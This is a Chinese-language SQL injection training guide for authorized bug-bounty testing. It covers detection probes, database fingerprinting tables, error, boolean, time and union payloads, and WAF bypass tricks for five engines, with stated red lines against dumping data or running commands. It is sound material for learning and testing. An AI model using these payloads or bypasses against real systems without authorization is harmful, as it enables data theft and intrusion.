# 01 · SQL 数据库全谱：判定 · 语法 · 测试 · 绕过 · 学习

> 覆盖：MySQL/MariaDB · MSSQL · Oracle · PostgreSQL · SQLite（+达梦/人大金仓等国产库的判定思路）。
> 用法：先用 §一 通用流程确认「有注入面」，再用 §二 判定「是哪种库」，然后进对应分节。

---

## 一、通用层：与库无关的判定流程

### 1.1 注入点检测探针（按序发，每步都是最小无害请求）

| 步 | 探针 | 观察 | 结论 |
|---|---|---|---|
| 0 | 原始请求 ×3 | 响应哪些部分天然波动 | 建立基线（对照实验法，07 篇 04 §1） |
| 1 | `id=1` → `id=2-1` | 响应是否与 `id=1` 一致 | **算术等价**：一致=参数进了数值上下文（强信号，且无害） |
| 2 | `id=1'` | 500/报错/内容变化/无变化 | 报错含 SQL 字样=直接进 §二 认库；无变化≠安全（可能被转义/可能不在 SQL 里） |
| 3 | `id=1 AND 1=1` vs `id=1 AND 1=2` | 两者差异 | 布尔神谕成立=可注 |
| 4 | `id=1;SELECT 1`（堆叠探测） | 报错变化 | 判断是否支持多语句（PHP+mysqli_multi/PDO::emulate、MSSQL、PG 常见支持；JDBC 默认不支持） |
| 5 | 字符串上下文：`name=a' AND '1'='1` vs `'1'='2` | 同上 | 引号闭合判定 |

**判定表**（组合读）：

```
算术等价成立 + 布尔差异成立        → 数值型注入，确认
单引号报错含库名/语法词            → 确认 + 直接认库（最快路径）
布尔差异成立但引号无反应           → 数值上下文（不需要闭合引号）
全部无反应但功能确实查库           → 参数化（预编译）概率高 → 转查「结构注入」：
    order by 字段 / 表名列名 / like 通配 / limit 数值 / in 列表 —— 这些位置常常无法参数化，是「参数化系统」的残留注入面
```

> **关键判定经验**：现代框架下 90% 的参数值注入已被预编译挡住，**剩下的注入长在「结构位」**（ORDER BY/GROUP BY/表名/列名/LIMIT）。看到 `?orderBy=create_time&sort=desc` 这种参数，比看到 `?id=1` 兴奋十倍。MyBatis `${}` 就是结构位注入的头号产地（grimoire：`MyBatis ${}`）。

### 1.2 注入类型 → 神谕选择（哪个库都一样）

| 类型 | 成立条件 | 取数速度 | 备注 |
|---|---|---|---|
| 回显（union） | 页面能渲染查询结果 | 最快 | 需先定列数 |
| 报错 | 报错文本回显 | 快 | 每请求多比特，优先于盲注 |
| 布尔盲注 | 真假条件有稳定内容差 | 慢 | 每请求 1 bit |
| 时间盲注 | 延时函数可用且无熔断 | 慢+不稳 | 超时防御杀它（信道战争，dojo 02/06） |
| OOB 带外 | 目标可出网（DNS/HTTP） | 中 | 库各有原生通道，见分节 |

union 定列数两步（标准动作）：`ORDER BY n` 递增到报错 → `UNION SELECT NULL,NULL,...` 补到不报错，再用 `UNION SELECT 1,2,3...` 找渲染位。

---

## 二、认库：一张总表

### 2.1 报错指纹（有报错时 1 秒定库）

| 库 | 特征报错 |
|---|---|
| MySQL | `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ...` · `Unknown column 'x' in 'field list'` · `Table 'db.x' doesn't exist` |
| MSSQL | `Unclosed quotation mark after the character string 'x'.` · `Microsoft OLE DB Provider for SQL Server` · `Conversion failed when converting the varchar value ...` |
| Oracle | `ORA-00933: SQL command not properly ended` · `ORA-01756: quoted string not properly terminated` · `ORA-00942: table or view does not exist` |
| PostgreSQL | `ERROR: syntax error at or near "x"` · `unterminated quoted string: x` · `column "x" does not exist` |
| SQLite | `SQLITE_ERROR: near "x": syntax error` · `no such column: x` · PHP 侧 `SQLite3::` 前缀 |

### 2.2 行为指纹（无报错时用语法差异探测——每个探针单独发）

| 探针 | MySQL | MSSQL | Oracle | PostgreSQL | SQLite |
|---|---|---|---|---|---|
| 注释 `-- `（后带空格） | ✅ | ✅ | ✅ | ✅ | ✅ |
| 注释 `#` | ✅ | ❌ | ❌ | ❌ | ❌ |
| 注释 `/**/` | ✅ | ✅ | ✅ | ✅ | ✅ |
| 拼接 `'a' 'b'`（并列字符串） | ❌(语法错) | ✅ | ✅ | ❌ | ❌ |
| 拼接 `'a'+'b'` | ❌(变算术) | ✅(串接) | ❌ | ❌ | ❌ |
| 拼接 `'a'\|\|'b'` | ❌(变逻辑或) | ❌ | ✅ | ✅ | ✅ |
| `CONCAT('a','b')` | ✅ | ❌(2012+部分) | ❌(两参) | ✅ | ❌(3.44+才有) |
| `LIMIT 1` | ✅ | ❌ | ❌ | ✅ | ✅ |
| `TOP 1`（SELECT 后） | ❌ | ✅ | ❌ | ❌ | ❌ |
| `ROWNUM`（WHERE 中） | ❌ | ❌ | ✅ | ❌ | ❌ |
| `SELECT ... FROM dual` | ✅(兼容) | ❌ | ✅(必须) | ❌(无dual) | ✅(可不带FROM) |
| 不带 FROM 的 SELECT | ✅ | ✅ | ❌ | ✅ | ✅ |

**探针写法示例**（数值上下文，观察真/假/错三态）：
```
?id=1 AND (SELECT 'a'||'b')='ab'      → 真: Oracle/PG/SQLite 候选
?id=1 AND (SELECT 'a'+'b')='ab'       → 真: MSSQL 候选
?id=1 AND CONCAT('a','b')='ab'        → 真: MySQL/PG 候选
?id=1' LIMIT 1-- -                     → 正常: MySQL/PG/SQLite；报错: MSSQL/Oracle
```
三个探针交叉基本锁定唯一候选。

### 2.3 版本与身份查询（确认库之后的第一个「取数证明」）

| 库 | 版本 | 当前用户 | 当前库 | 延时函数 |
|---|---|---|---|---|
| MySQL | `version()` / `@@version` | `user()` / `current_user()` | `database()` | `SLEEP(5)` / `BENCHMARK(5e6,MD5('a'))` / `GET_LOCK('a',5)` |
| MSSQL | `@@version` | `user_name()` / `system_user` | `db_name()` | `WAITFOR DELAY '0:0:5'` |
| Oracle | `SELECT banner FROM v$version WHERE ROWNUM=1` | `SELECT user FROM dual` | `SELECT sys_context('USERENV','DB_NAME') FROM dual` | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` |
| PostgreSQL | `version()` | `current_user` | `current_database()` | `pg_sleep(5)` |
| SQLite | `sqlite_version()` | —（无用户概念） | —（文件名即库） | 无原生 → `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1e8/2))))` 重计算延时 |

> **红线执行版**：SRC 报告证明「可注入」= 取 `version()` 一个值即可（或布尔真假各一次截图）。**到此为止**。拖库、写文件（`INTO OUTFILE`）、执行命令（`xp_cmdshell`/`COPY TO PROGRAM`/UDF）= 改变状态或超量取数，全部越线。

---

## 三、分库详解

### 3.1 MySQL / MariaDB（国产系统 80% 是它）

**【判定】补充**
- 端口 3306；应用侧 `mysqli`/`PDO` 报错前缀；`information_schema` 可访问=版本 ≥5.0
- MariaDB vs MySQL：`version()` 返回含 `MariaDB`；10.x 版本号开头
- 云特征：RDS 类实例 `user()` 常是业务账号非 root（影响可利用性预期）

**【语法】速查（注入视角）**
```sql
-- 注释: -- (后必须空格) / # / /**/ / /*!50000 ...*/(版本门注释,>=5.00.00执行)
-- 元数据: information_schema.tables/columns/schemata
-- 串接: CONCAT(a,b,...) / CONCAT_WS(sep,...)
-- 截取: SUBSTR(s,i,n)=SUBSTRING=MID / LEFT(s,n) / ORD()=ASCII()
-- 编码: HEX()/UNHEX()/CHAR(n,...)/0x十六进制字面量
-- 聚合: GROUP_CONCAT(col SEPARATOR ',')
-- 分页: LIMIT n OFFSET m / LIMIT m,n
-- 文件: LOAD_FILE(path)(读,secure_file_priv限制) / INTO OUTFILE(写,红线)
-- 条件: IF(c,a,b) / CASE WHEN c THEN a ELSE b END / IFNULL
```

**【测试】最小验证序列**
```
1 报错: id=1' AND extractvalue(1,concat(0x7e,version()))-- -     (或 updatexml)
2 布尔: id=1 AND substr(database(),1,1)='a'  (换字母对比)
3 时间: id=1 AND sleep(3)-- -   (先测 sleep(3) 单发确认时延神谕可用)
4 union: ORDER BY 定列数 → UNION SELECT 1,version(),3-- -
5 结构位: ?orderBy=(SELECT IF(1=1,id,name)) / ?orderBy=id,(sleep(3))
```

**【绕过】要点（机制级，实例查 PATT）**
- **注释变体**：`-- -`（URL 里 `--+-`）、`#`→`%23`、`/**/` 切割关键字（`UNI/**/ON`）、`/*!UNION*/ /*!SELECT*/`（版本门注释，老 WAF 规则常不识别）
- **空白替代**：`%09 %0a %0b %0c %0d %a0`（MySQL 特有的宽空白集合，比空格绕过率高）；括号包裹 `UNION SELECT(1),(2)`
- **等价函数链**：`SUBSTR→MID→LEFT+INSERT`、`ASCII→ORD→HEX`、`SLEEP→BENCHMARK→GET_LOCK→笛卡尔积大表联查`、`AND→&&`、`OR→||`、`=→LIKE/REGEXP/strcmp`
- **大小写与重复关键字**：`UnIoN`、`UNunionION`（针对「删一次关键字」的笨过滤器）
- **数字型免引号**：`0x` 十六进制、`CHAR()`、十进制 Unicode——绕过「拦单引号」的规则
- **HPP/解析差异**：见 08 篇与 dojo 02/06

**【学习】**
- 本地：docker `mysql:5.7`+`mysql:8.0` 双版本（行为有差异：8.0 默认 caching_sha2、`mysql_native_password` 变化）+ sqli-labs 前 20 关（**先自己打再看答案**，智库答案册纪律）
- 智库检索：`MySQL injection` · `extractvalue` · `sqlmap tamper`（tamper 脚本名=绕过机制目录，逐个理解原理）· `MyBatis ${}`
- 验收：能解释 `/*!50000*/` 为什么能过部分 WAF（MySQL 特有版本门语法，非 MySQL 的解析器当普通注释）；能手写无引号布尔盲注取 `database()` 的完整探针序列

### 3.2 MSSQL（老国企/政务/.NET 系常见）

**【判定】补充**：`@@version` 含 `Microsoft SQL Server 20xx`；Windows 域环境的库常与 AD 有牵连（linked server/`xp_dirtree` 出网=边界⑥证据）

**【语法】速查**
```sql
-- 注释: -- / /**/  (无 #)
-- 串接: 'a'+'b' (2017+ 有 CONCAT)
-- 截取: SUBSTRING(s,i,n) / LEFT / ASCII / UNICODE
-- 分页: TOP n / OFFSET m ROWS FETCH NEXT n ROWS ONLY(2012+)
-- 元数据: sysobjects / sys.tables / INFORMATION_SCHEMA
-- 延时: WAITFOR DELAY '0:0:5' / WAITFOR TIME
-- 危险面(只识别不执行): xp_cmdshell / OPENROWSET / sp_OACreate / linked servers
```

**【测试】**：报错型天然强（`CONVERT(int,@@version)` 类转换报错直接把版本抛回显里——`AND 1=CONVERT(int,db_name())` 是 MSSQL 报错注入的招牌探针）；堆叠查询在 .NET/PHP 连接下常可用（但**只验证到 `;SELECT 1` 无报错为止，不叠 WAITFOR 以外的东西**）。

**【绕过】要点**：`+` 拼接绕 CONCAT 黑名单；`%01-%08` 冷门空白；`WAITFOR DELAY` 的引号可用十六进制场景少——时间注入被拦时换 `WAITFOR TIME`（等到绝对时刻）；.NET 参数化下主攻结构位（同 §一）。

**【学习】**：docker `mcr.microsoft.com/mssql/server` 起本地实例；智库 `MSSQL injection` · `xp_cmdshell`（读识别特征，不实操执行面）；验收：说出 MSSQL 与 MySQL 在「注释/拼接/分页/延时」四项语法差异并各给一个探针。

### 3.3 Oracle（金融/电信/大型 ERP）

**【判定】补充**：所有查询必须有 `FROM`（`FROM dual`）；默认端口 1521；应用侧 `oracle.jdbc` / `cx_Oracle` 报错

**【语法】速查**
```sql
-- 注释: -- / /**/  (无 #)
-- 串接: 'a'||'b'
-- 截取: SUBSTR / ASCII / INSTR
-- 分页: ROWNUM<=n 包一层 / 12c+ OFFSET FETCH
-- 元数据: ALL_TABLES / ALL_TAB_COLUMNS / USER_TABLES(当前schema)
-- 延时: DBMS_PIPE.RECEIVE_MESSAGE('a',5) / DBMS_LOCK.SLEEP(需权限)
-- 报错注入: UTL_INADDR.GET_HOST_NAME('x') / CTXSYS.DRITHSX.SN(1,'x') / XMLType
-- OOB(识别级): UTL_HTTP.REQUEST / UTL_INADDR → 你的dnslog(=出网证据,一次即停)
```

**【测试】**：报错注入优先（`UTL_INADDR` 类天然回显）；union 必须**类型对齐+同列数**（Oracle 严格），数字列用 `NULL` 占位试。

**【绕过】要点**：Oracle 的 WAF 绕过重点在**注释内联**（`SEL/**/ECT`）与**编码函数**（`CHR(117)||CHR(110)...` 拼单词免字面量）；`ROWNUM` 条件常被规则忽略。

**【学习】**：本地 docker `gvenzl/oracle-xe`；智库 `Oracle injection`；验收：能写出 Oracle 布尔盲注取 `SELECT user FROM dual` 首字符的探针。

### 3.4 PostgreSQL（新项目/云原生偏爱）

**【判定】补充**：5432；报错极其啰嗦（PG 的报错常带 `LINE 1:` 指示和上下文——**报错本身就是地图**）；`current_setting('server_version')`

**【语法】速查**
```sql
-- 注释: -- / /**/ / 美元引用 $$text$$ (绕单引号过滤的利器!)
-- 串接: 'a'||'b' / CONCAT
-- 分页: LIMIT n OFFSET m
-- 元数据: pg_catalog.pg_tables / information_schema
-- 延时: pg_sleep(5) / pg_sleep_for('5 seconds')
-- 报错: CAST(version() AS int) / 1/0
-- 危险面(识别级): COPY ... TO PROGRAM(超级用户) / lo_import/lo_export / dblink(出网)
```

**【测试】**：`$$` 美元引用是 PG 特色探针——单引号被过滤时 `AND $$_$$=$$_$$` 真假测试仍可进行；`pg_sleep` 前先确认无语句超时（`statement_timeout` 常设 30s，你的 sleep(5) 可用但 sleep(60) 会熔断）。

**【绕过】要点**：`$$`/`$tag$` 引用体系绕引号过滤；`CHR()` 拼接；PG 大小写不敏感关键字但**表名大小写敏感**（双引号语义）——过滤器搞混大小写规则时出现差异面。

**【学习】**：docker `postgres:16`；智库 `PostgreSQL injection` · `dollar quoting`；验收：解释 `$$` 为什么能绕单引号黑名单（字符串字面量的另一套定界语法）。

### 3.5 SQLite（桌面/嵌入式/小型 CMS/APP 本地库）

**【判定】补充**：报错 `SQLITE_ERROR`/`near "x": syntax error`；**无网络端口**（文件库）——遇到它意味着注入面在「读文件库」的应用里（CMS 安装文件、APP 后端、桌面软件）；`sqlite_master` 是它的 information_schema。

**【语法】速查**
```sql
-- 注释: -- / /**/
-- 元数据: SELECT name,sql FROM sqlite_master
-- 无用户/无权限体系/无延时函数(重计算模拟)
-- 附加面(识别级): ATTACH DATABASE 写文件→webshell路径 (红线:不执行)
```

**【测试】**：布尔+union 为主；延时用 `RANDOMBLOB` 重计算（不稳定，慎用）；`sqlite_version()` 取版本证明。

**【学习】**：任何机器 `sqlite3 test.db` 即环境；智库 `SQLite injection`；验收：说出 SQLite 与 MySQL 的三个结构性差异（无服务端口/无权限体系/类型亲和性）。

### 3.6 国产库（达梦 DM / 人大金仓 KingbaseES / OceanBase / TiDB / GaussDB）

**【判定】**：报错前缀直接自报（`DM SQL Error`/`KES`/`GaussDB`）；**行为归类法**——金仓/GaussDB 是 **PG 系**（用 §3.4 的探针和语法）、OceanBase/TiDB 是 **MySQL 协议系**（§3.1）、达梦是 **Oracle 语法系**（§3.3，`FROM dual` 可用）。判定出「协议族」后按族打。
**【国情要点】**：信创改造系统（政务/金融）里国产库+老中间件（东方通/宝兰德）组合高频出现，**语法族判定**比版本号更重要；这类目标的 N-day 生态在 CNVD 里比在 ExploitDB 里全（你的雷达表主粮逻辑）。

---

## 四、层判定：注入面在「哪一层」被参数化（现代架构的关键判定）

| 观察组合 | 判定 | 下一步 |
|---|---|---|
| 所有参数引号无反应 + ORDER BY 可控差异 | 值层参数化，**结构位裸奔** | 主攻 orderBy/表名/limit 参数 |
| JSON body 注入无反应 + QueryString 有反应 | ORM 处理 JSON、拼接处理 QS | 双通道分别测（解析差异面，08 篇） |
| 登录接口无反应 + 搜索接口报错 | 局部参数化（老代码没改完） | 全面测「次要功能」：搜索/筛选/导出/报表 |
| 全部无反应且报错统一 | 全局预编译+错误处理完善 | SQL 面基本关闭，转逻辑/越权（04 篇 03/04）——**这也是判定：知道哪里不该再花时间** |

---

## 【本篇学习建议】

1. 学习顺序：**§一 通用流程 → §3.1 MySQL（主力，国产生态 80%）→ §二 认库表 → 其余四库各 1 小时**。国产库按「协议族归类」学，不单独深挖。
2. 练习环境三件套：sqli-labs（MySQL 全类型）+ 本地各库 docker（对照 §2.3 把每个函数亲手跑一遍——**跑过的函数才会在实战中被你想起来**）+ vulhub 里带 SQLi 的真实系统（CMS 级场景感）。
3. sqlmap 的正确用法：它做体力活（盲注取数），你做判断（哪里值得注入、`--technique` 选哪种、tamper 为什么选这个）。**先用本篇手工打通关再放 sqlmap**，否则你永远不知道它为什么失败。
4. 与 cnvd-lab 的接口：本篇是 I 线（注入）的判定层教材，`I01 LDAP与NoSQL` 见 02 分册，`I02 文件操作类` 独立。

## 【验收标准】

- [ ] 认库表 §2.2 能默写探针三件套（拼接/分页/注释）并解释原理
- [ ] 五种库的延时函数和版本函数不查表能写出
- [ ] 完成 sqli-labs 1-10 关手工（先打后看答案，答案册纪律）
- [ ] 能对「参数化系统」说出四个残留注入面（结构位）
- [ ] 03_训练回路/02 验收题库 A 区 1-8 题达 L2

## 【智库检索词】

`sql injection` 分库名查 · `sqlmap tamper` · `order by injection` · `MyBatis ${}` · `报错注入 extractvalue` · `SQLite master` · `信创 达梦`（薄，国产库知识主要靠 CNVD 库+本节归类法）
